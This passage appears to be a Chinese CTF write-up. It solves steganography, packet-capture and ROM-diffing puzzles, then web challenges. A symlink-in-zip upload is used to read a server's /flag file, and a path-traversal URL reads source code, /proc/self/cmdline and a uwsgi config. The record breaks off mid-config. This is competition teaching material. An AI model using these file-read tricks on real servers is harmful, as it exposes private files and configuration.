<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"flag1.txt"</span><span class="p">,</span><span class="w"> </span><span class="nl">"path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"flag1.txt"</span><span class="p">,</span><span class="w"> </span><span class="nl">"last_modified"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-11-06T07:43:20.952991Z"</span><span class="p">,</span><span class="w"> </span><span class="nl">"created"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-11-06T07:43:20.952991Z"</span><span class="p">,</span><span class="w"> </span><span class="nl">"content"</span><span class="p">:</span><span class="w"> </span><span class="s2">"788c3a1289cbe5383466f9184b07edac6a6b3b37f78e0f7ce79bece502d63091ef5b7087bc44"</span><span class="p">,</span><span class="w"> </span><span class="nl">"format"</span><span class="p">:</span><span class="w"> </span><span class="s2">"text"</span><span class="p">,</span><span class="w"> </span><span class="nl">"mimetype"</span><span class="p">:</span><span class="w"> </span><span class="s2">"text/plain"</span><span class="p">,</span><span class="w"> </span><span class="nl">"size"</span><span class="p">:</span><span class="w"> </span><span class="mi">76</span><span class="p">,</span><span class="w"> </span><span class="nl">"writable"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"file"</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>来写脚本（注意把 key 的 <code class="language-plaintext highlighter-rouge">\\</code> 换成 <code class="language-plaintext highlighter-rouge">\</code>！）：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">flag1</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"788c3a1289cbe5383466f9184b07edac6a6b3b37f78e0f7ce79bece502d63091ef5b7087bc44"</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x1e\xe0</span><span class="s">[u</span><span class="se">\xf2\xf2\x81\x01</span><span class="s">U_</span><span class="se">\x9d</span><span class="s">!yc</span><span class="se">\x8e\xce</span><span class="s">[X</span><span class="se">\r\x04\x94\xbc</span><span class="s">9</span><span class="se">\x1d\xd7\xf8\xde\xdc</span><span class="s">d</span><span class="se">\xb2</span><span class="s">Q</span><span class="se">\xa3\x8a</span><span class="s">?</span><span class="se">\x16\xe5\x8a</span><span class="s">9'</span>

<span class="k">def</span> <span class="nf">xor_each</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
    <span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)):</span>
        <span class="n">out</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">xor_each</span><span class="p">(</span><span class="n">flag1</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>
</code></pre></div></div>

<h3 id="flag-2">Flag 2</h3>

<p>从导出的 HTTP 信息无法直接看到 flag2 的身影，所以重新看流量，可以看到有明文的 WebSocket 流量，再看的话会发现是在用 Jupyter Notebook 的终端。</p>

<p>因为懒得写脚本解析，所以我是在 Wireshark 里面一个一个把命令拼起来尝试理解的。大概做的事情是：</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">pip3 install stego-lsb</code></li>
  <li><code class="language-plaintext highlighter-rouge">stegolsb wavsteg -h -i ki-ringtrain.wav -s flag2.txt -o flag2.wav -n 1</code></li>
  <li><code class="language-plaintext highlighter-rouge">7za flag2.7z flag2.wav -p"Wakarimasu! `date` `uname -nom` `nproc`"</code></li>
</ol>

<p>わかります（我知道）！我们有 flag2.7z，所以需要反推密码，并且使用 <code class="language-plaintext highlighter-rouge">stegolsb</code> 取出隐写的 flag2.txt。</p>

<p>7z 的密码依赖于对应三个命令在 <span class="you-name">You</span> 酱电脑上的执行结果，可以搜集到一些有意义的信息：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">7za</code> 命令的输出告诉我们，CPU 是 Intel Core i7-10510U，8 核，地区是 en_US.utf8，64 位操作系统。</li>
  <li>完成命令之后的回显提示，<span class="you-name">You</span> 酱的机器名是 you-kali-vm。</li>
  <li>修改 Wireshark 时间显示设置，可以看到 <code class="language-plaintext highlighter-rouge">7za</code> 命令执行的大致时间是 2021-11-06 15:44:15.190。</li>
</ul>

<p>所以可以知道：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">date</code> 的格式大致是 <code class="language-plaintext highlighter-rouge">Sat 06 Nov 2021 03:44:15 PM CST</code>，虽然不知道时区，但是完全可以猜测是东八区。</li>
  <li><code class="language-plaintext highlighter-rouge">uname -nom</code> 输出是 <code class="language-plaintext highlighter-rouge">you-kali-vm x86_64 GNU/Linux</code>。</li>
  <li><code class="language-plaintext highlighter-rouge">nproc</code> 的输出是 8。</li>
</ul>

<p>最后拼出密码是 <code class="language-plaintext highlighter-rouge">Wakarimasu! Sat 06 Nov 2021 03:44:15 PM CST you-kali-vm x86_64 GNU/Linux 8</code>。</p>

<p>然后用 stegolsb，翻一下文档即可：<code class="language-plaintext highlighter-rouge">stegolsb wavsteg -r -i flag2.wav -o flag2.txt -n 1 -b 76</code>。（76 是 hex 字符串的长度，可以参考 flag1.txt 的长度）</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">flag2</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"788c3a1289cbe5383466f9184b07edac6a6b3b37f78e0f7ce79bece502d63091ef5b7087bc44"</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x1e\xe0</span><span class="s">[u</span><span class="se">\xf2\xf2\x81\x01</span><span class="s">U_</span><span class="se">\x9d</span><span class="s">!yc</span><span class="se">\x8e\xce</span><span class="s">[X</span><span class="se">\r\x04\x94\xbc</span><span class="s">9</span><span class="se">\x1d\xd7\xf8\xde\xdc</span><span class="s">d</span><span class="se">\xb2</span><span class="s">Q</span><span class="se">\xa3\x8a</span><span class="s">?</span><span class="se">\x16\xe5\x8a</span><span class="s">9'</span>

<span class="k">def</span> <span class="nf">xor_each</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
    <span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)):</span>
        <span class="n">out</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">k</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">xor_each</span><span class="p">(</span><span class="n">flag2</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>
</code></pre></div></div>

<p>注意 key 和 flag1 的其实是一样的，<del>生成了 key 却不用的 <span class="you-name">You</span> 酱是屑</del>。</p>

<p>附注：xmc……啊不，<span class="you-name">You</span> 酱赛后和我聊了一下上面这个问题的原因：</p>

<blockquote>
  <p>关于这个，实际运行过程是打开ipynb然后从上到下ctrl+enter跑一遍。所以你看到的前一个key是上次运行的结果，后面的key才是真正跑的。</p>

  <p>其实我本来是打算从头开始粘贴代码跑的，然后录pcap的时候翻车了两三次，就懒得删文件重新弄了（</p>
</blockquote>

<h2 id="叶子的新歌">叶子的新歌</h2>

<p><em>（Flag 2 &amp; 整道题目总榜一血）</em></p>

<p><em>（3 个 flag 的获取过程写一起）</em></p>

<p>这题也太套娃了⑧！</p>

<p>看这个题目，第一反应就是往 Audacity 里头拖，结果……歌挺好听的，就是不管看波形图还是频谱图都啥都没看出来。</p>

<p>结果文件上一按空格：</p>

<p class="center"><img src="/pictures/geekgame-wp/leafsnewsong/1.png" alt="macOS QuickLook" /></p>

<p class="center"><em>图 2. macOS QuickLook 截图</em></p>

<p>嗯？<code class="language-plaintext highlighter-rouge">Secret in Album Cover!!</code>？</p>

<p>那么首先要把专辑封面取出来，我用的工具是——VLC，播放的时候它会把封面图片缓存出来，取出来即可。（<a href="https://unix.stackexchange.com/questions/41287/how-to-extract-album-cover-image-from-mp3-file">https://unix.stackexchange.com/questions/41287/how-to-extract-album-cover-image-from-mp3-file</a>）</p>

<p>然后跑 <code class="language-plaintext highlighter-rouge">zsteg</code> 看看（stegsolve 提取也行）:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>zsteg art.png
b1,b,lsb,xy         .. text: <span class="s2">"m#C</span><span class="se">\"\t</span><span class="s2">%1&gt;"</span>
b1,rgb,lsb,xy       .. file: PNG image data, 1000 x 1000, 8-bit grayscale, non-interlaced
b1,rgba,lsb,xy      .. file: PGP Secret Key -
b2,r,lsb,xy         .. text: <span class="s2">"EUEUTAEU"</span>
b2,g,lsb,xy         .. text: <span class="s2">"EDTAQP@A"</span>
b2,g,msb,xy         .. text: <span class="s2">"UU]]UUU_uUuUUww"</span>
b2,b,lsb,xy         .. text: <span class="s2">"PTPPQUTT"</span>
b2,bgr,msb,xy       .. text: <span class="s2">"S}}uU_WwUUEQ"</span>
b2,rgba,lsb,xy      .. text: <span class="s2">"++++++/o"</span>
b2,abgr,msb,xy      .. text: <span class="s2">"SSSSSSS["</span>
b4,r,lsb,xy         .. text: <span class="s2">"vEfEfvwfgvvfDDDGfgvggvfffwvfffgvfffdDDDVvfwvfffC2#3#</span><span class="se">\"</span><span class="s2">#</span><span class="se">\"</span><span class="s2">23#3EEDDTTEE</span><span class="se">\"</span><span class="s2">2#P"</span>
b4,r,msb,xy         .. text: <span class="s2">"nfff&amp;</span><span class="se">\"\"\"</span><span class="s2">jnf"</span>
b4,g,lsb,xy         .. text: <span class="s2">"vfevvvggfffffffwvffvffffwffffgfgfffffffwffvfffvffffvvvvggwvvvfEUTUfTWgwvfu</span><span class="se">\#</span><span class="nv">$ge</span><span class="s2">%Dh"</span>
b4,g,msb,xy         .. text: <span class="s2">"nffnffff"</span>
b4,b,lsb,xy         .. text: <span class="s2">"</span><span class="se">\"</span><span class="s2">2</span><span class="se">\"\"</span><span class="s2">2</span><span class="se">\"\"\"\"</span><span class="s2">5DDEDDDDDDTDDDDUTDDDB</span><span class="se">\"\"</span><span class="s2">#2</span><span class="se">\"</span><span class="s2">222</span><span class="se">\"</span><span class="nv">$D</span><span class="s2">##</span><span class="se">\"</span><span class="s2">#DDEEvgvgUDUUgfgffTFtEWgwvgi"</span>
b4,b,msb,xy         .. text: <span class="s2">"DLDDLDDDD"</span>
b4,rgb,lsb,xy       .. text: <span class="s2">"xFrG%cf&amp;cF5Pg"</span>
b4,rgb,msb,xy       .. text: <span class="s2">"NndFnlFfdFb</span><span class="nv">$Fb$Fb$Fb</span><span class="s2">"</span>
b4,bgr,lsb,xy       .. text: <span class="s2">"Hrv'Ce&amp;cf6@U"</span>
b4,bgr,msb,xy       .. text: <span class="s2">"dNflNfdFfdB&amp;dB&amp;dB&amp;l"</span>
b4,rgba,lsb,xy      .. text: <span class="s2">"xOg/G/V?f/f?F?U"</span>
b4,abgr,msb,xy      .. text: <span class="s2">"OfOfOfO&amp;O&amp;O&amp;O&amp;O&amp;O&amp;"</span>
<span class="nv">$ </span><span class="c"># 看看 b1,rgb,lsb,xy</span>
<span class="nv">$ </span>zsteg <span class="nt">-E</span> b1,rgb,lsb,xy art.png <span class="o">&gt;</span> art2.png
</code></pre></div></div>

<p>可以看到 art2.png 是个类似二维码的东西，搜索可以知道是 aztec code，找个网站 decode 得到 47 75 72 20 66 72 70 65 72 67 20 76 61 20 75 76 66 67 62 74 65 6e 7a 2e 0a =&gt; Gur frperg va uvfgbtenz.</p>

<p>这我知道，rot13 嘛，得到 “The secret in histogram”。</p>

<p>Histogram（直方图）？哪里有直方图？虽然看到图片的颜色不太对，但是用 macOS preview 的「调整颜色」没有看到明显的特征，于是我暂时卡这了，先去看别的题了。</p>

<p>几个小时之后回来，想试试 <code class="language-plaintext highlighter-rouge">ffmpeg</code> 看看有没有漏掉的东西：</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffmpeg <span class="nt">-i</span> LeafsNewSong.mp3
ffmpeg version 4.4.1 Copyright <span class="o">(</span>c<span class="o">)</span> 2000-2021 the FFmpeg developers
  built with Apple clang version 12.0.0 <span class="o">(</span>clang-1200.0.32.29<span class="o">)</span>
  configuration: <span class="nt">--prefix</span><span class="o">=</span>/usr/local/Cellar/ffmpeg/4.4.1_2 <span class="nt">--enable-shared</span> <span class="nt">--enable-pthreads</span> <span class="nt">--enable-version3</span> <span class="nt">--cc</span><span class="o">=</span>clang <span class="nt">--host-cflags</span><span class="o">=</span> <span class="nt">--host-ldflags</span><span class="o">=</span> <span class="nt">--enable-ffplay</span> <span class="nt">--enable-gnutls</span> <span class="nt">--enable-gpl</span> <span class="nt">--enable-libaom</span> <span class="nt">--enable-libbluray</span> <span class="nt">--enable-libdav1d</span> <span class="nt">--enable-libmp3lame</span> <span class="nt">--enable-libopus</span> <span class="nt">--enable-librav1e</span> <span class="nt">--enable-librubberband</span> <span class="nt">--enable-libsnappy</span> <span class="nt">--enable-libsrt</span> <span class="nt">--enable-libtesseract</span> <span class="nt">--enable-libtheora</span> <span class="nt">--enable-libvidstab</span> <span class="nt">--enable-libvorbis</span> <span class="nt">--enable-libvpx</span> <span class="nt">--enable-libwebp</span> <span class="nt">--enable-libx264</span> <span class="nt">--enable-libx265</span> <span class="nt">--enable-libxml2</span> <span class="nt">--enable-libxvid</span> <span class="nt">--enable-lzma</span> <span class="nt">--enable-libfontconfig</span> <span class="nt">--enable-libfreetype</span> <span class="nt">--enable-frei0r</span> <span class="nt">--enable-libass</span> <span class="nt">--enable-libopencore-amrnb</span> <span class="nt">--enable-libopencore-amrwb</span> <span class="nt">--enable-libopenjpeg</span> <span class="nt">--enable-libspeex</span> <span class="nt">--enable-libsoxr</span> <span class="nt">--enable-libzmq</span> <span class="nt">--enable-libzimg</span> <span class="nt">--disable-libjack</span> <span class="nt">--disable-indev</span><span class="o">=</span>jack <span class="nt">--enable-avresample</span> <span class="nt">--enable-videotoolbox</span>
  libavutil      56. 70.100 / 56. 70.100
  libavcodec     58.134.100 / 58.134.100
  libavformat    58. 76.100 / 58. 76.100
  libavdevice    58. 13.100 / 58. 13.100
  libavfilter     7.110.100 /  7.110.100
  libavresample   4.  0.  0 /  4.  0.  0
  libswscale      5.  9.100 /  5.  9.100
  libswresample   3.  9.100 /  3.  9.100
  libpostproc    55.  9.100 / 55.  9.100
Input <span class="c">#0, mp3, from 'LeafsNewSong.mp3':</span>
  Metadata:
    TSS             : Logic Pro X 10.7.0
    iTunNORM        :  0000072C 00000736 00003208 00003140 00009E92 0000501A 00006703 00007E86 00007678 00007E1F
    iTunSMPB        :  00000000 00000210 000007A5 00000000002709CB 00000000 002350D1 00000000 00000000 00000000 00000000 00000000 00000000
    title           : 叶子的新歌
    artist          : 叶子
    album           : Secret <span class="k">in </span>Album Cover!!
    TRACKTOTAL      : aHR0cDovL2xhYi5tYXh4c29mdC5uZXQvY3RmL2xlZ2FjeS50Ynoy
    lyrics          : 空无一人的房间
                    : 我望向窗外
                    : 想回到昨天
                    :
                    : 琥珀色的风
                    : 能否将 回忆传到那边
                    : 闪烁的星
                    : 照亮夜空 连成我的思念
                    :
                    : 你 在梦的另一边
                    : 站在 日落的地平线
                    : 背离这世界而去
                    : 想 在回不去的时间里
                    : 遇见你 遇见你 遇见你
                    : 遇见你 遇见你 遇见你
    comment         : 你还记得吗？小时候，我家和你家都在一个大院里。放学以后，我们经常一起在院子里玩。你虽然是个女孩子，但总是能和男孩子们玩到一块去。
                    :
                    : 夏天的时候我们挖蚯蚓、捉蚂蚱；冬天，院子里的大坡上积了一层雪，我们就坐在纸箱子压成的雪橇上，一次次从坡顶滑到坡底。那个时候你还发现，坐在铁簸箕上滑得更快。
                    :
                    : ——当然，那次你也摔得挺惨的。
    encoder         : Lavf58.45.100
  Duration: 00:00:58.07, start: 0.011995, bitrate: 621 kb/s
  Stream <span class="c">#0:0: Audio: mp3, 44100 Hz, stereo, fltp, 320 kb/s</span>
    Metadata:
      encoder         : Lavf
  Stream <span class="c">#0:1: Video: png, rgba(pc), 1000x1000, 90k tbr, 90k tbn, 90k tbc (attached pic)</span>
    Metadata:
      comment         : Cover <span class="o">(</span>front<span class="o">)</span>
At least one output file must be specified
</code></pre></div></div>

<p>嗯？Logic Pro X 10.7.0，富富！而且有歌词，有注释，还有个 <code class="language-plaintext highlighter-rouge">aHR0cDovL2xhYi5tYXh4c29mdC5uZXQvY3RmL2xlZ2FjeS50Ynoy</code>。</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'aHR0cDovL2xhYi5tYXh4c29mdC5uZXQvY3RmL2xlZ2FjeS50Ynoy'</span> | <span class="nb">base64</span> <span class="nt">-D</span>
http://lab.maxxsoft.net/ctf/legacy.tbz2
</code></pre></div></div>

<p>嗯！下载下来解压，看到一个 img，以及 <code class="language-plaintext highlighter-rouge">foryou.txt</code>:</p>

<blockquote>
  <p>我有一张很久很久以前的软盘。说起来以前的操作系统还能装在软盘里，把软盘放进电脑就可以启动，很神奇吧？我给你看过这张软盘，但你总说这是Word保存图标的手办……什么跟什么啦！</p>

  <p>现在已经没有带软驱的电脑了，甚至连带光驱的电脑都没有了。以前软盘里的那些东西，也许再也启动不了了吧。</p>

  <p>时间过得好快啊，转眼间，就来到了现实。</p>
</blockquote>

<p>用 testdisk 看 <code class="language-plaintext highlighter-rouge">To_the_past.img</code>，可以从 FAT12 分区提取出 <code class="language-plaintext highlighter-rouge">NOTE.TXT</code> 和 <code class="language-plaintext highlighter-rouge">MEMORY.ZIP</code> 几个文件。</p>

<p>而且 <code class="language-plaintext highlighter-rouge">foryou.txt</code> 一直在暗示启动，所以来点 qemu:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ qemu-system-x86_64 -drive format=raw,file=To_the_past.img
</code></pre></div></div>

<p>得到 flag2，以及「最后的密码」。</p>

<p>看导出的文件，<code class="language-plaintext highlighter-rouge">NOTE.TXT</code>:</p>

<blockquote>
  <p>备忘</p>

  <p>密码是：宾驭令诠怀驭榕喆艺艺宾庚艺怀喆晾令喆晾怀</p>
</blockquote>

<p>发现密码直接输进去不管什么编码都不对。搜索可以发现 <a href="https://zhidao.baidu.com/question/394971095.html">https://zhidao.baidu.com/question/394971095.html</a>，按照里面提的规则解析得到一串数字，就是 <code class="language-plaintext highlighter-rouge">MEMORY.ZIP</code> 的密码。</p>

<p>解压看到两个 bin，以及 <code class="language-plaintext highlighter-rouge">readme.txt</code>:</p>

<blockquote>
  <p>我以前很喜欢玩红白机，当然，现在也很喜欢。超级马里奥、魂斗罗、坦克大战、马戏团、冒险岛……一玩能玩一天。</p>

  <p>小时候家里有一台红白机，也经常叫你一起玩游戏，只不过，我记得你不喜欢这些东西。你最喜欢在4399玩找不同，而且你还玩的特别棒，简直就是找不同滴神。</p>

  <p>呜呜，红白机已经属于时代的眼泪了。</p>
</blockquote>

<p>找不同啊……对比两个 bin，发现其实还挺相似，只是有的时候左边会多一个字节，有的时候右边会多一个，而且前三处不同合并组成的字符是 <code class="language-plaintext highlighter-rouge">NES</code>，好像是红白机的 ROM binary。</p>

<p>整了个脚本提取，调试花掉了不少时间：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">x</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"nes.bin"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"left.bin"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">left</span><span class="p">:</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"right.bin"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">right</span><span class="p">:</span>
        <span class="n">l</span> <span class="o">=</span> <span class="n">left</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">right</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
        <span class="n">lp</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="n">rp</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">l</span><span class="p">[</span><span class="n">lp</span><span class="p">]</span> <span class="o">==</span> <span class="n">r</span><span class="p">[</span><span class="n">rp</span><span class="p">]:</span>
                <span class="n">lp</span> <span class="o">+=</span> <span class="mi">1</span>
                <span class="n">rp</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
                <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
                    <span class="n">ifl</span> <span class="o">=</span> <span class="n">l</span><span class="p">[</span><span class="n">lp</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">lp</span><span class="o">+</span><span class="mi">1</span> <span class="o">+</span> <span class="n">i</span><span class="p">]</span>
                    <span class="n">ifr</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="n">rp</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">rp</span><span class="o">+</span><span class="mi">1</span> <span class="o">+</span> <span class="n">i</span><span class="p">]</span>
                    <span class="k">if</span> <span class="n">ifl</span> <span class="o">==</span> <span class="n">r</span><span class="p">[</span><span class="n">rp</span><span class="p">:</span><span class="n">rp</span><span class="o">+</span><span class="n">i</span><span class="p">]</span> <span class="ow">and</span> <span class="n">ifr</span> <span class="o">==</span> <span class="n">l</span><span class="p">[</span><span class="n">lp</span><span class="p">:</span><span class="n">lp</span><span class="o">+</span><span class="n">i</span><span class="p">]:</span>
                        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
                        <span class="k">continue</span>
                    <span class="k">elif</span> <span class="n">ifl</span> <span class="o">==</span> <span class="n">r</span><span class="p">[</span><span class="n">rp</span><span class="p">:</span><span class="n">rp</span><span class="o">+</span><span class="n">i</span><span class="p">]:</span>
                        <span class="n">x</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="nb">bytes</span><span class="p">([</span><span class="n">l</span><span class="p">[</span><span class="n">lp</span><span class="p">]]))</span>
                        <span class="n">lp</span> <span class="o">+=</span> <span class="mi">1</span>
                        <span class="k">break</span>
                    <span class="k">elif</span> <span class="n">ifr</span> <span class="o">==</span> <span class="n">l</span><span class="p">[</span><span class="n">lp</span><span class="p">:</span><span class="n">lp</span><span class="o">+</span><span class="n">i</span><span class="p">]:</span>
                        <span class="n">x</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="nb">bytes</span><span class="p">([</span><span class="n">r</span><span class="p">[</span><span class="n">rp</span><span class="p">]]))</span>
                        <span class="n">rp</span> <span class="o">+=</span> <span class="mi">1</span>
                        <span class="k">break</span>
                    <span class="k">else</span><span class="p">:</span>
                        <span class="k">raise</span> <span class="nb">ValueError</span>
            <span class="k">if</span> <span class="n">lp</span> <span class="o">&gt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">l</span><span class="p">)</span> <span class="ow">or</span> <span class="n">rp</span> <span class="o">&gt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
                <span class="c1">#print("[STOP]")
</span>                <span class="c1">#print(lp, len(l), rp, len(r))
</span>                <span class="k">break</span>
<span class="n">x</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p>最后会缺一个 <code class="language-plaintext highlighter-rouge">FF</code>，懒得调试脚本了，直接补上（不然模拟器开不出来）。</p>

<p>然后模拟器启动！发现 VirtuaNES 比较好用，可以直接弄网上找到的金手指代码。</p>

<p class="center"><img src="/pictures/geekgame-wp/leafsnewsong/2.png" alt="VirtuaNES" /></p>

<p class="center"><em>图 3. VirtuaNES 启动魔改版超级玛丽</em></p>

<p>没有玩过红白机，所以开着金手指玩了一个多小时玩到凌晨四点多，还是没有看到 flag（可能是因为开了跳关之后的问题？我不确定）。</p>

<p>Update 1: 群聊讨论之后才知道超级玛丽的最后一关就是无限循环的，要正确钻水管才能到终点。果然只有我小时候没有玩过红白机了。</p>

<p>最终的解决方案是，网上找到 SMB NES ROM Text Editor 可以加载 ROM 中的文本，然后一加载：</p>

<p class="center"><img src="/pictures/geekgame-wp/leafsnewsong/3.png" alt="SMB NES ROM Text Editor" /></p>

<p class="center"><em>图 4. 使用 SMB NES ROM Text Editor 加载 ROM 中的文本</em></p>

<blockquote>
  <p>LAB.MAXXSOFT.NET CTF LEAFS</p>

  <p>VISIT THIS TO</p>

  <p>REVEAL THE TRUTH.</p>
</blockquote>

<p>打开网站（空格替换为 <code class="language-plaintext highlighter-rouge">/</code>），输入 flag2 那里没用到的密码，就看到了……一段悲惨的爱情故事……以及……flag3。</p>

<p class="center"><img src="/pictures/geekgame-wp/leafsnewsong/4.png" alt="A sad story" /></p>

<p class="center"><em>图 5. 悲惨的爱情故事</em></p>

<p>呜呜。</p>

<p>我们现在还差 flag1。最后是搜索 “photoshop 直方图” 的时候看到有这个功能，想起来自己的 VM 里面有一份 PS CS6，把 art2.png 拖进去点直方图，然后点右上角那个警告符号（我到现在都不知道这个是什么功能），就能看到一张像条形码一样的图：</p>

<p class="center"><img src="/pictures/geekgame-wp/leafsnewsong/5.png" alt="Histogram and bar code" /></p>

<p class="center"><em>图 6. 直方图与条形码</em></p>

<p>直接扫是扫不出的，要反一下色，得到 <a href="https://xmcp.ltd/KCwBa">https://xmcp.ltd/KCwBa</a>。</p>

<blockquote>
  <p>你还记得高中的时候吗？那时在市里的重点中学，我们是同桌。我以前还怪讨人嫌的，老是惹你生气，然后你就不和我说话，我就死乞白赖地求你，或者讲笑话逗你。</p>

  <p>不过，你笑起来好可爱，从小就好可爱。此后的一切，也都是从那个笑容开始的吧。</p>

  <p>真的，好想回到那个时候啊。</p>

  <p>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</p>

  <p>（以下全是 <code class="language-plaintext highlighter-rouge">Ook.</code> <code class="language-plaintext highlighter-rouge">Ook!</code> 和 <code class="language-plaintext highlighter-rouge">Ook?</code>，省略）</p>
</blockquote>

<p>找个转换服务：<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a> 即可得到 flag1。</p>

<h2 id="在线解压网站">在线解压网站</h2>

<p><em>（总榜一血）</em></p>

<p>看到源代码的第一反应就是软链接。</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ln</span> <span class="nt">-s</span> /flag flag
<span class="nv">$ </span>zip <span class="nt">-y</span> 1.zip flag
  adding: flag <span class="o">(</span>stored 0%<span class="o">)</span>
</code></pre></div></div>

<p>把 1.zip 传上去即可。</p>

<h2 id="早期人类的聊天室">早期人类的聊天室</h2>

<p>uwsgi 居然这么屑，作为 Python web dev 真是大开眼界。</p>

<p>首先，显然，查看 chatlog 的页面可以 LFI（本地文件包含）。通过 <a href="https://prob17-placeholder.geekgame.pku.edu.cn/module?name=chatlog&amp;log=../utils.py">https://prob17-placeholder.geekgame.pku.edu.cn/module?name=chatlog&amp;log=../utils.py</a> 可以看到 <code class="language-plaintext highlighter-rouge">utils.py</code> 的源代码，没啥大问题。</p>

<p>但是包含不了 <code class="language-plaintext highlighter-rouge">/flag</code>，可能是权限不够，无论如何，既然是 Linux Docker，那就让我康康 <code class="language-plaintext highlighter-rouge">/proc/self/cmdline</code> 吧。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uwsgi�--ini�/tmp/uwsgi-ctf.ini�
</code></pre></div></div>

<p>再看看 <code class="language-plaintext highlighter-rouge">/tmp/uwsgi-ctf.ini</code>：</p>

<div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">[uwsgi]</span>
<span class="py">socket</span> <span class="p">=</span> <span class="s">:3031</span>
<span class="py">chdir</span> <span class="p">=</span> <span class="s">/usr/src/ufctf</span>
<span class="py">manage-script-name</span> <span class="p">=</span> <span class="s">true</span>
